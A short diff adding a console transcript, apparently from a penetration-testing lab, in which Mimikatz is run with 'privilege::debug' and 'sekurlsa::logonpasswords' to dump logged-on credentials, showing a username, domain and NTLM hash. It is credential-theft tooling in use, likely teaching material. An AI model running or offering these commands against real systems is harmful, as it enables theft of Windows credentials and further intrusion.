@@ -1,0 +1,10 @@
+C:\Tools\Mimikatz> mimikatz.exe
+
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::logonpasswords
+
+ * Username : offsec
+         * Domain   : corp1
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+
